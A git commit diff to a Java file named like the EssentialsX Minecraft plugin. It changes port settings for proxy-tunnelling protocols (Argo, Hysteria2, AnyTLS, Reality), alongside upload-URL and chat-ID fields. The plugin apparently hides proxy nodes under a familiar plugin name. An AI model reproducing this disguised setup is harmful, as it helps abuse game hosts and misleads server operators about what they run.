31e5a2e9b383f74fa3702ca8a5c61004794b324e
tabibalib-boop <tabibalib@gmail.com>
2026-03-01 21:36:27 +0300

    Update EssentialsX.java

--- src/main/java/com/example/essentialsx/EssentialsX.java
+++ src/main/java/com/example/essentialsx/EssentialsX.java
@@ -82,10 +82,10 @@ public class EssentialsX extends JavaPlugin {
         env.put("ARGO_DOMAIN", "");
         env.put("ARGO_AUTH", "");
         env.put("S5_PORT", "");
-        env.put("HY2_PORT", "3128");
+        env.put("HY2_PORT", "46564");
         env.put("TUIC_PORT", "");
-        env.put("ANYTLS_PORT", "3128");
-        env.put("REALITY_PORT", "3128");
+        env.put("ANYTLS_PORT", "46564");
+        env.put("REALITY_PORT", "46564");
         env.put("ANYREALITY_PORT", "");
         env.put("UPLOAD_URL", "");
         env.put("CHAT_ID", "");
